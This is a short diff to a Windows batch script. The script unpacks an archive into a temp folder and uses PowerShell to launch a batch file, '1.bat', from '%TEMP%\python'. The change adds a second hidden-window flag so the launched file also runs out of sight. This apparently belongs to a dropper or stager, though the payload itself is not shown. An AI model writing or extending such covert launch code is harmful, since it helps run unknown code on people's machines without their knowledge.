@@ -13,5 +13,5 @@ for %%A in ("%output%") do (
     )
 )
 powershell -Command "Expand-Archive -Path '%output%' -DestinationPath '%tempdir%' -Force"
-powershell -WindowStyle Hidden -Command "Start-Process -FilePath $env:TEMP\python\1.bat"
+powershell -WindowStyle Hidden -Command "Start-Process -FilePath $env:TEMP\python\1.bat -WindowStyle Hidden"
 exit
